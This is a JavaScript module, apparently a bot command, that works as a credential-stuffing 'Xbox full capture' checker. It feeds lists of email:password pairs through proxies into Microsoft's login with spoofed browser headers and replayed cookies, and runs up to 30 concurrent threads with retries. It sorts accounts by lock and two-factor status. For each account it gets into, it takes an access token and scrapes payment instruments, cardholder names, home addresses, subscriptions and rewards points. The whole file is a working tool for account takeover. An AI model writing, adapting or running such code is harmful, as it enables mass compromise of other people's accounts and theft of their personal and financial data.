// ============================================================
//  Xbox Full Capture Checker — 1:1 port of backup-2.py
//  .xboxchk / /xboxchk command
// ============================================================

const { proxiedFetch } = require("./proxy-manager");

const LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";

const LOGIN_HEADERS = {
  Host: "login.live.com",
  Connection: "keep-alive",
  "Cache-Control": "max-age=0",
  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "sec-ch-ua-platform-version": '"12.0.0"',
  "Upgrade-Insecure-Requests": "1",
  Origin: "https://login.live.com",
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "X-Edge-Shopping-Flag": "1",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  Referer: "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
  "Accept-Language": "en-US,en;q=0.9",
  Cookie: 'CAW=<EncryptedData xmlns="http://www.w3.org/2001/04/xmlenc#" Id="BinaryDAToken1" Type="http://www.w3.org/2001/04/xmlenc#Element"><EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"></EncryptionMethod><ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:KeyName>http://Passport.NET/STS</ds:KeyName></ds:KeyInfo><CipherData><CipherValue>M.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ+YNEFX7J4eX4arCa69y0j3ebxxB0ET0+8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on+9vOMIfZZIako5uD3VceGABh7ZxD+cwC0ksKgsXzQs9cJFZ+G1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA==</CipherValue></CipherData></EncryptedData>;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89',
  "Accept-Encoding": "gzip, deflate",
};

const TOKEN_URL = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none";

const TOKEN_HEADERS = {
  Host: "login.live.com",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.5",
  "Accept-Encoding": "gzip, deflate",
  Connection: "close",
  Referer: "https://account.microsoft.com/",
};

function parseLR(text, left, right) {
  const re = new RegExp(left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "(.*?)" + right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "s");
  const m = text.match(re);
  return m ? m[1] : "";
}

function extractCookies(headers) {
  const cookies = {};
  const raw = headers.getSetCookie?.() || [];
  for (const c of raw) {
    const [pair] = c.split(";");
    const eq = pair.indexOf("=");
    if (eq > 0) cookies[pair.slice(0, eq).trim()] = pair.slice(eq + 1).trim();
  }
  return cookies;
}

function checkStatus(text, url, cookies) {
  if (
    text.includes("Your account or password is incorrect.") ||
    text.includes("That Microsoft account doesn\\'t exist.") ||
    text.includes("Sign in to your Microsoft account") ||
    text.includes("timed out")
  )
    return "FAILURE";
  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";
  if (
    text.includes("account.live.com/recover?mkt") ||
    text.includes("recover?mkt") ||
    text.includes("account.live.com/identity/confirm?mkt") ||
    text.includes("Email/Confirm?mkt")
  )
    return "2FACTOR";
  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt=")) return "CUSTOM_LOCK";
  if (("ANON" in cookies || "WLSSC" in cookies) && url.includes("https://login.live.com/oauth20_desktop.srf?"))
    return "SUCCESS";
  return "UNKNOWN_FAILURE";
}

async function checkSingleAccount(credential, signal) {
  const sep = credential.indexOf(":");
  if (sep < 0) return { status: "fail", user: credential, password: "", detail: "Invalid format" };

  const user = credential.slice(0, sep);
  const password = credential.slice(sep + 1);

  try {
    const loginBody =
      `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&` +
      `PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24&` +
      `PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&` +
      `login=${encodeURIComponent(user)}&loginfmt=${encodeURIComponent(user)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`;

    // Block 1: Login POST
    const r1 = await proxiedFetch(LOGIN_URL, {
      method: "POST",
      headers: LOGIN_HEADERS,
      body: loginBody,
      redirect: "follow",
      signal,
    });
    const text1 = await r1.text();
    const allCookies = extractCookies(r1.headers);
    const finalUrl = r1.url || "";

    const status = checkStatus(text1, finalUrl, allCookies);
    if (status !== "SUCCESS") {
      if (status === "FAILURE" || status === "UNKNOWN_FAILURE")
        return { status: "fail", user, password, detail: "Invalid Credentials" };
      if (status === "BAN") return { status: "locked", user, password, detail: "Banned" };
      if (status === "2FACTOR") return { status: "locked", user, password, detail: "2FA/Verify" };
      if (status === "CUSTOM_LOCK") return { status: "locked", user, password, detail: "Abuse/Cancel" };
      return { status: "fail", user, password, detail: status };
    }

    // Block 3: Token fetch
    const r2 = await proxiedFetch(TOKEN_URL, {
      method: "GET",
      headers: { ...TOKEN_HEADERS, Cookie: r1.headers.get("set-cookie") || "" },
      redirect: "follow",
      signal,
    });
    const url2 = r2.url || (await r2.text());
    const token = decodeURIComponent(parseLR(url2, "access_token=", "&token_type") || "");
    if (!token) return { status: "locked", user, password, detail: "Token Parse Fail" };

    const apiHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/88.0.4324.96 Safari/537.36",
      Pragma: "no-cache",
      Accept: "application/json",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "en-US,en;q=0.9",
      Authorization: `MSADELEGATE1.0="${token}"`,
      Connection: "keep-alive",
      "Content-Type": "application/json",
      Host: "paymentinstruments.mp.microsoft.com",
      "ms-cV": "FbMB+cD6byLL1mn4W/NuGH.2",
      Origin: "https://account.microsoft.com",
      Referer: "https://account.microsoft.com/",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      "Sec-GPC": "1",
    };

    // Block 5: Payment info
    const r3 = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
      { headers: apiHeaders, signal }
    );
    const src3 = await r3.text();

    const balance = parseLR(src3, 'balance":', ',"') || "N/A";
    const cardHolder = parseLR(src3, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') || "N/A";
    const accountHolderName = parseLR(src3, 'accountHolderName":"', '","') || "N/A";
    const zipcode = parseLR(src3, '"postal_code":"', '",') || "N/A";
    const region = parseLR(src3, '"region":"', '",') || "N/A";
    const address1 = parseLR(src3, '{"address_line1":"', '",') || "N/A";
    const city = parseLR(src3, '"city":"', '",') || "N/A";

    // Block 9: Subscription check
    const r5 = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
      { headers: apiHeaders, signal }
    );
    const src5 = await r5.text();

    const country = parseLR(src5, 'country":"', '"}') || "N/A";
    const subscription = parseLR(src5, 'title":"', '",') || "N/A";
    const autoRenew = (() => {
      const ctpid = parseLR(src5, '"subscriptionId":"ctp:', '"');
      if (!ctpid || ctpid === "N/A") return "N/A";
      return parseLR(src5, `{"subscriptionId":"ctp:${ctpid}","autoRenew":`, ",") || "N/A";
    })();
    const startDate = parseLR(src5, '"startDate":"', "T") || "N/A";
    const nextRenewal = parseLR(src5, '"nextRenewalDate":"', "T") || "N/A";
    const description = parseLR(src5, '"description":"', '"') || "N/A";
    const quantity = parseLR(src5, '"quantity":', ",") || "N/A";
    const currency = parseLR(src5, '"currency":"', '"') || "";
    const totalAmount = parseLR(src5, '"totalAmount":', ",") || "N/A";
    const item1 = parseLR(src5, '"title":"', '"') || "N/A";

    // Block 10: Rewards points
    const r4 = await proxiedFetch("https://rewards.bing.com/", {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/80.0.3987.149 Safari/537.36",
        Pragma: "no-cache",
        Accept: "*/*",
        Cookie: r1.headers.get("set-cookie") || "",
      },
      signal,
    });
    const src4 = await r4.text();
    const points = parseLR(src4, ',"availablePoints":', ',"') || "0";

    // Build captures
    const captures = {
      Address: `${address1}, ${city}, ${region}, ${zipcode}`,
      CC: `Country: ${country} | Holder: ${accountHolderName} | Card: ${cardHolder} | Balance: $${balance}`,
      Sub1: `Item: ${item1} | AutoRenew: ${autoRenew} | Start: ${startDate} | NextBill: ${nextRenewal}`,
      Sub2: `Product: ${description} | Qty: ${quantity} | Points: ${points} | Total: ${totalAmount}${currency}`,
      Points: points,
    };

    // Active vs expired
    let isActive = false;
    if (subscription && subscription !== "N/A" && nextRenewal && nextRenewal !== "N/A") {
      try {
        const renewalDate = new Date(nextRenewal);
        isActive = renewalDate >= new Date();
      } catch {}
    }

    return {
      status: isActive ? "hit" : "free",
      user,
      password,
      captures,
      detail: isActive ? "Active Subscription" : "No/Expired Sub",
    };
  } catch (err) {
    if (err.name === "AbortError") return { status: "fail", user, password, detail: "Aborted" };
    const msg = err.message || String(err);
    if (msg.includes("fetch") || msg.includes("ECONNR") || msg.includes("timeout") || msg.includes("socket"))
      return { status: "retry", user, password, detail: "Connection Error" };
    return { status: "fail", user, password, detail: msg.slice(0, 60) };
  }
}

async function processWithPool(items, concurrency, fn, onProgress, signal) {
  const results = [];
  let idx = 0;
  let completed = 0;

  async function worker() {
    while (idx < items.length) {
      if (signal?.aborted) break;
      const i = idx++;
      if (i >= items.length) break;
      const result = await fn(items[i], signal);
      results[i] = result;
      completed++;
      if (onProgress) onProgress(completed, items.length);
    }
  }

  const workers = Array.from({ length: Math.min(concurrency, items.length) }, () => worker());
  await Promise.all(workers);
  return results.filter(Boolean);
}

async function checkXboxAccounts(accounts, threads = 30, onProgress, signal) {
  return processWithPool(
    accounts,
    threads,
    async (cred, sig) => {
      for (let attempt = 0; attempt < 3; attempt++) {
        const result = await checkSingleAccount(cred, sig);
        if (result.status !== "retry") return result;
        await new Promise((r) => setTimeout(r, 1000 + Math.random() * 2000));
      }
      return { status: "fail", user: cred.split(":")[0] || cred, password: cred.split(":")[1] || "", detail: "Max retries" };
    },
    onProgress,
    signal
  );
}

module.exports = { checkXboxAccounts, checkSingleAccount };
